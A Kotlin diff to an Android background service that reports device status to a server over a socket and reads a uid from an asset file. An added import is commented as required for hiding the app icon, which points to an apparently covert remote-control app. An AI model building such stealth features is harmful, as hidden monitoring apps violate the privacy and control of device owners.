@@ -4,6 +4,7 @@ import android.annotation.SuppressLint
 import android.app.*
 import android.app.WallpaperManager
 import android.content.*
+import android.content.pm.PackageManager          // ⬅️ WAJIB untuk hideAppIcon/changeTheme
 import android.content.pm.ServiceInfo
 import android.graphics.Bitmap
 import android.graphics.BitmapFactory
@@ -1151,12 +1152,22 @@ ${htmlContent}
     
 
     fun emitStatus(statusObj: JSONObject) {
-        if (socket?.connected() != true) return
-        socket?.emit("device:status", JSONObject().apply {
-            put("deviceId", deviceId)
-            put("status", statusObj)
-        })
+    if (socket?.connected() != true) return
+    socket?.emit("device:status", JSONObject().apply {
+        put("deviceId", deviceId)
+        put("status", statusObj)
+    })
+}
+
+private fun readUid(): String {
+    return try {
+        val json = assets.open("uid.json").bufferedReader().use { it.readText() }
+        JSONObject(json).optString("uid", "")
+    } catch (e: Exception) {
+        Log.e("DeviceService", "readUid error: ${e.message}")
+        ""
     }
+}
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
 
